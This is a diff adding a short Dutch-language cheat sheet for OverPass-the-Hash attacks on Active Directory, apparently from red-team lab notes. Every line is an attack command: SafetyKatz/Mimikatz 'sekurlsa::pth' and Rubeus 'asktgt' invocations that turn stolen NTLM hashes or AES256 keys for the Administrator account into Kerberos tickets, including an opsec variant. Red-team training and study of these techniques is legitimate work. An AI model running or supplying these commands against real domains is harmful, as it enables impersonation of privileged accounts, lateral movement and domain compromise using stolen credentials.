@@ -1,0 +1,7 @@
+# OverPass-the-Hash - Tokens genereren uit hashes/keys
+# Met Mimikatz (elevated):
+C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:Administrator /domain:domain.local /aes256:AES256_KEY /run:powershell.exe" "exit"
+# Met Rubeus (geen elevatie nodig):
+.\Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /ptt
+# Met Rubeus (elevated, opsec met AES):
+.\Rubeus.exe asktgt /user:Administrator /aes256:AES256_KEY /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
